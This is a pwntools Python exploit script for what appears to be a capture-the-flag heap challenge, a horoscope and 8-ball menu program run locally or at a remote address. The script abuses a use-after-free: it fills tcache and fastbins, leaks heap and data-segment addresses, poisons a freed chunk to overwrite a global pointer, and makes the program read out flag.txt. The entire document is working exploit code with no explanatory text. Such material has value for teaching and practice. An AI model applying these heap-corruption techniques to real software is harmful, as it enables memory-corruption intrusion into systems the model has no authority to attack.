#!/usr/bin/python3

from pwn import *
import binascii

DEBUG = False
LOCAL = True

def exploit():
  def binary_connect():
    if LOCAL:
      if DEBUG:
        return gdb.debug('./chal', '''
            b print_scope
            continue
        ''')
      else:
        return process('./chal')
    else:
      return remote('34.136.150.230', 49153)

  def sign(input):
    p.send(b'0\n')
    p.recvuntil(b"sign\n > ")
    p.send(input + b'\n')
    return p.recvuntil(b' > ')

  def eightball(input, save):
    p.send(b'1\n')
    p.recvuntil(b"8 ball\n > ")
    p.send(input + b'\n')
    resp = p.recvuntil(b'\n')
    p.recvuntil(b' > ')
    p.send(save.encode('utf-8') + b'\n')
    p.recvuntil(b' > ')
    return resp

  def cookie():
    p.send(b'2\n')
    resp = p.recvuntil(b'\n')
    p.recvuntil(b' > ')
    return resp

  def read_8ball(index):
    p.send(b'3\n')
    p.recvuntil(b' > ')
    p.send(str(index).encode('utf-8') + b'\n')
    return p.recvuntil(b' > ')
      
  def read_cookie(index):
    p.send(b'4\n')
    p.recvuntil(b' >')
    p.send(str(index).encode('utf-8') + b'\n')
    return p.recvuntil(b' > ')

  def delete_8ball():
    p.send(b'5\n')
    return p.recvuntil(b' > ')

  def get_lucky_num(input): 
    p.send(b'7\n')
    p.recvuntil(b' > ')
    p.send(input + b'\n')
    p.recvuntil(b' > ')

  def store_lucky_num(first, input, delete):
    p.send(b'8\n')
    if first:
      p.recvuntil(b' > ')
      p.send(input + b'\n')
      p.recvuntil(b' > ')
    else:
      p.recvuntil(b' > ')
      if delete:
        p.send(b'N\n')
        p.recvuntil(b' > ')
        p.send(b'Y\n')
      else:
        p.send(b'Y\n')
      p.recvuntil(b' > ')



  # exploit begins here 
  p = binary_connect()
  p.recvuntil(b'> ')

  # fill cookie list
  for i in range(0, 0x21):
    cookie()

  # fill 0x80 tcache
  for _ in range(0, 8):
    eightball(b"flag.txt\0", 'Y')

  for _ in range(0, 7):
    delete_8ball()  

  # fill one entry in fastbins
  delete_8ball()

  # free UAF with link in fastbins
  resp = cookie()
  assert resp == b'You have no room to save any more horoscopes. Please choose one to delete\n'
  p.send(b'0\n')
  p.recvuntil(b' > ')

  # leak heap address
  leak = int.from_bytes(b'\x50' + read_cookie(0)[1:6], "little")
  heap_start = leak - 0x1250
  print(hex(leak))
  print(hex(heap_start))
  assert (heap_start & 0xfff) == 0 
  
  # alloc UAF into 8ball and fill up to the data segment address, read fortune to leak data address
  for _ in range(0, 7):
    eightball(b"flag.txt\0", 'Y')
  eightball(b"A" * (0x68 - 17), 'Y')
  leak = read_8ball(7)
  rough_leak = int.from_bytes(b'\x00' + leak.split(b'\n')[1], "little")
  data_base = rough_leak & ~0xfff
  global_addr = rough_leak - 0x200
  print(hex(global_addr))

  # fill last index in cookie array
  resp = cookie()

  # empty fastbins and refill tcaches (0x20 and 0x80)
  eightball(b"flag.txt\0", 'Y')
  eightball(b"flag.txt\0", 'Y')
  for _ in range(0, 7):
    delete_8ball()
    store_lucky_num(True, b'4', False)
    store_lucky_num(False, b'', True)

  # alloc and free UAF in last index
  resp = cookie()
  assert resp == b'You have no room to save any more horoscopes. Please choose one to delete\n'  
  p.send(b'32\n')
  p.recvuntil(b' > ')

  # consolidate
  p.send(b'9\n')
  p.recvuntil(b' > ')

  # resp = cookie()
  # assert resp == b'You have no room to save any more horoscopes. Please choose one to delete\n'  
  # p.send(b'32\n')
  # p.recvuntil(b' > ')

  # alloc and free UAF in index 32
  delete_8ball()
  sign(b'Aries')

  resp = cookie()
  assert resp == b'You have no room to save any more horoscopes. Please choose one to delete\n'  
  p.send(b'32\n')
  p.recvuntil(b' > ')

  # edit sign (UAF) 
  sign(global_addr.to_bytes(8,"little"))

  # alloc trash 
  store_lucky_num(True, b'4', False)

  # overwrite globals 
  flag_addr = heap_start + 0x1371
  file_lines = 1
  
  get_lucky_num(flag_addr.to_bytes(8,"little") + file_lines.to_bytes(3, "little"))

  # consult oracle
  p.send(b'6\n')
  resp = p.recvuntil(b' > ')
  print(resp[:resp.find(b'\n')])

if __name__ == "__main__":
  context.log_level = "debug"
  exploit()